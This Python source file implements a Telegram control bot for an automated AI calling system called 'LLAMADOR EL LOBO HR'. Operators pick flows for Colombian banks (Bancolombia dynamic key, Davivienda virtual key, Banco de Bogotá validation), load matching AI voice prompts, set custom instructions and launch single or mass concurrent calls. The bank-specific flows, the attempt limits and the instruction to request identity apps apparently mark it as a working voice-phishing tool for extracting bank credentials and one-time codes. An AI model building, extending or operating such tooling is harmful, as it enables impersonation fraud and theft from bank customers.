"""
Bot de Telegram para control del sistema de llamadas
Patrón: Command - Cada comando es una acción específica
"""
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from loguru import logger
from config import settings
from typing import TYPE_CHECKING, Dict, List, Optional
from call_flows import CallFlows
import asyncio

if TYPE_CHECKING:
    from main import CallerBot


class TelegramBot:
    """
    Bot de Telegram para gestión de llamadas
    Patrón: Facade - Interfaz simple para operaciones complejas
    """
    
    # Constantes
    MAX_CONCURRENT_CALLS = settings.max_concurrent_calls
    MAX_CALLS_TO_DISPLAY = 10
    MAX_FAILED_TO_SHOW = 5
    
    def __init__(self, caller_bot: 'CallerBot'):
        self.caller_bot = caller_bot
        self.app = Application.builder().token(settings.telegram_bot_token).build()
        self.current_flow: Dict[int, str] = {}  # chat_id -> flow_name
        self._setup_handlers()
    
    def _setup_handlers(self) -> None:
        """Registrar manejadores de comandos"""
        handlers = [
            ("start", self.start_command),
            ("flujos", self.flows_command),
            ("llamar", self.call_command),
            ("masivo", self.mass_call_command),
            ("activas", self.active_calls_command),
            ("colgar", self.hangup_all_command),
            ("instruccion", self.set_instruction_command),
        ]
        
        for command, handler in handlers:
            self.app.add_handler(CommandHandler(command, handler))
        
        self.app.add_handler(CallbackQueryHandler(self.button_callback))
    
    
    def _is_authorized(self, chat_id: int) -> bool:
        """Verificar autorización de chat"""
        return chat_id in settings.admin_ids_list
    
    def _validate_phone(self, phone: str) -> bool:
        """Validar formato de número telefónico"""
        return phone.startswith('+') and len(phone) >= 10
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Comando /start - Bienvenida y ayuda"""
        if not self._is_authorized(update.effective_chat.id):
            await update.message.reply_text("❌ Sin autorización")
            return
        
        welcome = """📞 **LLAMADOR EL LOBO HR**

🎯 **COMANDOS:**
/flujos - Seleccionar banco
/llamar +57312... - Llamar
/masivo +num1 +num2 - Múltiples llamadas
/activas - Ver llamadas
/colgar - Finalizar todas
/instruccion <texto> - Personalizar IA

🏦 **FLUJOS:**
• Bancolombia - App + clave dinámica
• Davivienda - Clave virtual
• Bogotá - Validación estándar

💡 **Uso:**
1. /flujos → Selecciona banco
2. /llamar +573012345678"""
        
        await update.message.reply_text(welcome, parse_mode='Markdown')
    
    
    async def call_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Comando /llamar - Iniciar llamada"""
        if not self._is_authorized(update.effective_chat.id):
            await update.message.reply_text("❌ Sin autorización")
            return
        
        if not context.args:
            await update.message.reply_text(
                "❌ Uso: /llamar +numero\n"
                "Ejemplo: /llamar +34612345678"
            )
            return
        
        phone = context.args[0].strip()
        
        if not self._validate_phone(phone):
            await update.message.reply_text(
                "❌ Número inválido\n"
                "Debe incluir + y código de país"
            )
            return
        
        chat_id = update.effective_chat.id
        
        # Verificar flujo activo
        if chat_id not in self.current_flow:
            await update.message.reply_text(
                "⚠️ **SIN FLUJO CONFIGURADO**\n\n"
                "1️⃣ Usa /flujos\n"
                "2️⃣ Selecciona banco\n"
                "3️⃣ Luego /llamar +numero",
                parse_mode='Markdown'
            )
            return
        
        flow = CallFlows.get_flow(self.current_flow[chat_id])
        flow_info = f"\n🏦 {flow['icon']} {flow['name']}" if flow else ""
        
        await update.message.reply_text(f"📞 Llamando a {phone}{flow_info}...")
        
        try:
            call_sid = await self.caller_bot.voip_manager.make_call(phone, chat_id)
            
            keyboard = [[InlineKeyboardButton("🔴 Colgar", callback_data=f"hangup_{call_sid}")]]
            
            await update.message.reply_text(
                f"✅ Llamada iniciada\n"
                f"📱 {phone}\n"
                f"🆔 {call_sid[:8]}",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        except Exception as e:
            logger.error(f"Error en llamada: {e}")
            await update.message.reply_text(f"❌ Error: {e}")
    
    
    async def set_instruction_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Comando /instruccion - Personalizar IA"""
        if not self._is_authorized(update.effective_chat.id):
            return
        
        if not context.args:
            await update.message.reply_text(
                "❌ Uso: /instruccion <texto>\n\n"
                "📝 Ejemplo:\n"
                "/instruccion Valida identidad solicitando app SOY YO\n\n"
                "💡 /flujos para predefinidos"
            )
            return
        
        instruction = ' '.join(context.args)
        
        try:
            self.caller_bot.ai_conversation.set_custom_prompt(instruction)
            
            # Limpiar flujo activo
            chat_id = update.effective_chat.id
            if chat_id in self.current_flow:
                del self.current_flow[chat_id]
            
            await update.message.reply_text(
                f"✅ Instrucción Configurada\n\n"
                f"📝 {instruction}"
            )
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {e}")
    
    
    async def flows_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Comando /flujos - Seleccionar banco"""
        if not self._is_authorized(update.effective_chat.id):
            return
        
        keyboard = []
        for flow_name in CallFlows.get_available_flows():
            flow = CallFlows.get_flow(flow_name)
            button = InlineKeyboardButton(
                f"{flow['icon']} {flow['name']}",
                callback_data=f"flow_{flow_name}"
            )
            keyboard.append([button])
        
        keyboard.append([InlineKeyboardButton("🔄 Limpiar", callback_data="flow_clear")])
        
        message = """🏦 **FLUJOS DISPONIBLES**

Selecciona el banco:

🏦 **Bancolombia**
• App + clave dinámica
• 3 intentos

🏛️ **Davivienda**
• Clave virtual
• 3 intentos

🏛️ **Bogotá**
• Validación estándar"""
        
        await update.message.reply_text(
            message,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    
    
    async def mass_call_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Comando /masivo - Llamadas múltiples"""
        if not self._is_authorized(update.effective_chat.id):
            return
        
        if not context.args:
            await update.message.reply_text(
                f"📞 Llamadas Masivas\n\n"
                f"Uso: /masivo +num1 +num2\n\n"
                f"Máximo: {self.MAX_CONCURRENT_CALLS}"
            )
            return
        
        numbers = [n.strip() for n in context.args if self._validate_phone(n.strip())]
        
        if len(numbers) > self.MAX_CONCURRENT_CALLS:
            await update.message.reply_text(
                f"⚠️ Máximo {self.MAX_CONCURRENT_CALLS} llamadas\n"
                f"Recibidos: {len(numbers)}"
            )
            return
        
        if not numbers:
            await update.message.reply_text("❌ Números inválidos")
            return
        
        await update.message.reply_text(f"🚀 Iniciando {len(numbers)} llamadas...")
        
        # Ejecutar llamadas en paralelo
        tasks = [
            self.caller_bot.voip_manager.make_call(phone, update.effective_chat.id)
            for phone in numbers
        ]
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        success = sum(1 for r in results if not isinstance(r, Exception))
        failed = [
            f"{numbers[i]}: {r}"
            for i, r in enumerate(results)
            if isinstance(r, Exception)
        ]
        
        msg = f"✅ Iniciadas: {success}/{len(numbers)}\n\n"
        
        if failed:
            msg += "❌ Fallidas:\n" + "\n".join(failed[:self.MAX_FAILED_TO_SHOW])
            if len(failed) > self.MAX_FAILED_TO_SHOW:
                msg += f"\n... y {len(failed) - self.MAX_FAILED_TO_SHOW} más"
        
        msg += "\n\n/activas para ver estado"
        
        await update.message.reply_text(msg)
    
    
    async def active_calls_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Comando /activas - Ver llamadas activas"""
        if not self._is_authorized(update.effective_chat.id):
            return
        
        active_calls = await self.caller_bot.voip_manager.get_active_calls()
        
        if not active_calls:
            await update.message.reply_text("📭 Sin llamadas activas")
            return
        
        in_progress = [c for c in active_calls if c['status'] in ['in-progress', 'answered']]
        ringing = [c for c in active_calls if c['status'] == 'ringing']
        
        msg = f"📞 **LLAMADAS ACTIVAS ({len(active_calls)})**\n\n"
        keyboard = []
        
        if in_progress:
            msg += f"🟢 **En Curso ({len(in_progress)}):**\n"
            for call in in_progress[:self.MAX_CALLS_TO_DISPLAY]:
                duration = f"{call['duration'] // 60}:{call['duration'] % 60:02d}"
                msg += f"• {call['number']} - {duration}\n"
                keyboard.append([
                    InlineKeyboardButton(
                        f"🔴 {call['number'][-4:]}",
                        callback_data=f"hangup_{call['sid']}"
                    )
                ])
            msg += "\n"
        
        if ringing:
            msg += f"📱 **Timbrando ({len(ringing)}):**\n"
            for call in ringing[:5]:
                msg += f"• {call['number']}\n"
            msg += "\n"
        
        if len(active_calls) > 15:
            msg += f"... y {len(active_calls) - 15} más\n\n"
        
        keyboard.append([
            InlineKeyboardButton("🔴 Colgar Todas", callback_data="hangup_all"),
            InlineKeyboardButton("🔄 Actualizar", callback_data="refresh_calls")
        ])
        
        await update.message.reply_text(
            msg,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    
    async def hangup_all_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Comando /colgar - Finalizar todas"""
        if not self._is_authorized(update.effective_chat.id):
            return
        
        active_calls = await self.caller_bot.voip_manager.get_active_calls()
        
        if not active_calls:
            await update.message.reply_text("📭 Sin llamadas activas")
            return
        
        keyboard = [[
            InlineKeyboardButton("✅ Confirmar", callback_data="confirm_hangup_all"),
            InlineKeyboardButton("❌ Cancelar", callback_data="cancel_action")
        ]]
        
        await update.message.reply_text(
            f"⚠️ ¿Colgar {len(active_calls)} llamadas?",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    
    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Manejar callbacks de botones"""
        query = update.callback_query
        await query.answer()
        
        # Flujo seleccionado
        if query.data.startswith("flow_"):
            await self._handle_flow_selection(query, update.effective_chat.id)
        
        # Colgar llamada individual
        elif query.data.startswith("hangup_"):
            call_sid = query.data.split("_", 1)[1]
            try:
                await self.caller_bot.voip_manager.hangup_call(call_sid)
                await query.edit_message_text(f"🔴 Llamada {call_sid[:8]} finalizada")
            except Exception as e:
                await query.edit_message_text(f"❌ Error: {e}")
        
        # Colgar todas
        elif query.data == "confirm_hangup_all":
            result = await self.caller_bot.voip_manager.hangup_all_calls()
            
            if result['total'] == 0:
                await query.edit_message_text("📭 Sin llamadas activas")
            else:
                msg = (
                    f"🔴 **Finalizadas**\n\n"
                    f"✅ Exitosas: {result['success']}\n"
                )
                if result['failed'] > 0:
                    msg += f"❌ Fallidas: {result['failed']}\n"
                msg += f"📊 Total: {result['total']}"
                await query.edit_message_text(msg)
        
        # Refrescar lista
        elif query.data == "refresh_calls":
            await self._refresh_active_calls(query)
        
        # Cancelar
        elif query.data == "cancel_action":
            await query.edit_message_text("❌ Cancelado")
    
    async def _handle_flow_selection(self, query, chat_id: int) -> None:
        """Manejar selección de flujo"""
        flow_name = query.data.split("_", 1)[1]
        
        if flow_name == "clear":
            if chat_id in self.current_flow:
                del self.current_flow[chat_id]
            self.caller_bot.ai_conversation.set_custom_prompt("")
            await query.edit_message_text("🔄 Flujo limpiado")
            return
        
        flow = CallFlows.get_flow(flow_name)
        if not flow:
            await query.edit_message_text("❌ Flujo no encontrado")
            return
        
        # Activar flujo
        self.current_flow[chat_id] = flow_name
        self.caller_bot.ai_conversation.set_custom_prompt(flow["prompt"])
        
        await query.edit_message_text(
            f"✅ **FLUJO ACTIVADO: {flow['name'].upper()}**\n\n"
            f"{flow['icon']} {flow['description']}\n\n"
            f"📢 Usa:\n"
            f"• /llamar +numero\n"
            f"• /masivo +num1 +num2",
            parse_mode='Markdown'
        )
        
        logger.info(f"✅ Flujo {flow_name} activado para chat {chat_id}")
    
    async def _refresh_active_calls(self, query) -> None:
        """Refrescar lista de llamadas activas"""
        active_calls = await self.caller_bot.voip_manager.get_active_calls()
        
        if not active_calls:
            await query.edit_message_text("📭 Sin llamadas activas")
            return
        
        msg = f"📞 **LLAMADAS ({len(active_calls)})**\n\n"
        keyboard = []
        
        for call in active_calls[:self.MAX_CALLS_TO_DISPLAY]:
            duration = f"{call['duration'] // 60}:{call['duration'] % 60:02d}"
            msg += f"• {call['number']} - {duration}\n"
            keyboard.append([
                InlineKeyboardButton(
                    f"🔴 {call['number'][-4:]}",
                    callback_data=f"hangup_{call['sid']}"
                )
            ])
        
        keyboard.append([
            InlineKeyboardButton("🔴 Colgar Todas", callback_data="hangup_all"),
            InlineKeyboardButton("🔄 Actualizar", callback_data="refresh_calls")
        ])
        
        await query.edit_message_text(
            msg,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    async def send_message(self, chat_id: int, text: str, **kwargs) -> None:
        """Enviar mensaje con manejo de errores"""
        try:
            await self.app.bot.send_message(chat_id=chat_id, text=text, **kwargs)
        except RuntimeError as e:
            if "event loop" in str(e).lower():
                try:
                    loop = (
                        self.app.bot._updater.loop
                        if hasattr(self.app.bot, '_updater')
                        else asyncio.get_event_loop()
                    )
                    if loop and loop.is_running():
                        future = asyncio.run_coroutine_threadsafe(
                            self.app.bot.send_message(chat_id=chat_id, text=text, **kwargs),
                            loop
                        )
                        future.result(timeout=3)
                except Exception as e2:
                    logger.error(f"Error en fallback send_message: {e2}")
            else:
                logger.error(f"RuntimeError en send_message: {e}")
        except Exception as e:
            logger.error(f"Error enviando mensaje: {e}")
    
    async def start(self) -> None:
        """Iniciar bot"""
        await self.app.initialize()
        await self.app.start()
        await self.app.updater.start_polling()
        logger.info("✅ Telegram bot iniciado")
    
    async def stop(self) -> None:
        """Detener bot"""
        await self.app.updater.stop()
        await self.app.stop()
        await self.app.shutdown()
